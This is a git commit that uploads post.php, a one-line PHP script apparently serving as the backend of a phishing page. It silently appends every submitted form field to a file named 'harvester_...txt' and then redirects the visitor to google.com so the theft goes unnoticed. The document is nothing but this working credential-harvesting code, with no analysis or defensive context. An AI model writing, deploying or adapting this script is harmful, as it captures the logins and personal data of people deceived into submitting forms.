93f1a7e7cb81e2715ff4ea7a9de81f967e7e485d
ardeco90 <39421120+ardeco90@users.noreply.github.com>
2018-06-27 19:13:28 +0000

    Add files via upload

---
+++ post.php
@@ -0,0 +1,1 @@
+<?php $file = 'harvester_2018-06-27 16:02:36.433660.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=http://www.google.com" />
